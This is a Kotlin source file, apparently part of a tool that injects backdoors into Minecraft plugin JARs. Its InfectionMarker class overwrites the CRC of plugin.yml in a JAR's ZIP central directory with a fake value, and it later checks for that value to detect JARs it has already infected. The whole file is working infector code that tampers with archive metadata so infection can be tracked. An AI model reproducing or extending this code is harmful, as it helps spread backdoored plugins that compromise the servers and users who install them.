package com.tmquan2508.inject.core.assembly

import com.tmquan2508.inject.log.BDLogger
import java.io.IOException
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardOpenOption
import java.util.zip.CRC32
import java.util.zip.ZipFile

class InfectionMarker(private val logger: BDLogger) {
    private val FAKE_MARKER_STRING = "openbd.injected"
    private val CENTRAL_DIR_SIGNATURE: Int = 0x02014b50
    private val EOCD_SIGNATURE: Int = 0x06054b50

    private fun calculateFakeCRC(): Long {
        val crc = CRC32()
        crc.update(FAKE_MARKER_STRING.toByteArray(StandardCharsets.UTF_8))
        return crc.value
    }

    fun isAlreadyPatched(jarPath: Path): Boolean {
        try {
            ZipFile(jarPath.toFile()).use { zipFile ->
                val entry = zipFile.getEntry("plugin.yml") ?: return false
                if (entry.crc == calculateFakeCRC()) {
                    logger.debug("[PatchCheck] Plugin already patched (marker found).")
                    return true
                }
            }
        } catch (e: IOException) {
            logger.warn("[PatchCheck] Could not check for fake CRC marker: ${e.message}")
        }
        return false
    }

    fun set(targetJarPath: Path) {
        try {
            logger.debug(" -> Setting infection marker by faking plugin.yml CRC...")
            val bytes = Files.readAllBytes(targetJarPath)
            val eocdOffset = findEOCDOffset(bytes)
            if (eocdOffset == -1) throw IOException("EOCD record not found in JAR")

            val centralDirOffset = bytes.getIntLE(eocdOffset + 16)
            var currentOffset = centralDirOffset

            while (bytes.getIntLE(currentOffset) == CENTRAL_DIR_SIGNATURE) {
                val fileNameLength = bytes.getShortLE(currentOffset + 28)
                val filename = String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8)

                if ("plugin.yml" == filename) {
                    val crcOffset = currentOffset + 16
                    bytes.putIntLE(crcOffset, calculateFakeCRC().toInt())
                    Files.write(targetJarPath, bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)
                    logger.debug(" -> Fake CRC marker set successfully on plugin.yml.")
                    return
                }

                val extraFieldLength = bytes.getShortLE(currentOffset + 30)
                val fileCommentLength = bytes.getShortLE(currentOffset + 32)
                currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength
            }
            throw IOException("plugin.yml not found in central directory to set marker")
        } catch (e: Exception) {
            throw IOException("Failed to set fake marker on ${targetJarPath.fileName}", e)
        }
    }

    private fun findEOCDOffset(bytes: ByteArray): Int {
        for (i in bytes.size - 22 downTo 0) {
            if (bytes.getIntLE(i) == EOCD_SIGNATURE) return i
        }
        return -1
    }

    private fun ByteArray.getIntLE(offset: Int): Int =
        ByteBuffer.wrap(this, offset, 4).order(ByteOrder.LITTLE_ENDIAN).int

    private fun ByteArray.getShortLE(offset: Int): Int =
        ByteBuffer.wrap(this, offset, 2).order(ByteOrder.LITTLE_ENDIAN).short.toInt() and 0xFFFF

    private fun ByteArray.putIntLE(offset: Int, value: Int) {
        ByteBuffer.wrap(this, offset, 4).order(ByteOrder.LITTLE_ENDIAN).putInt(value)
    }
}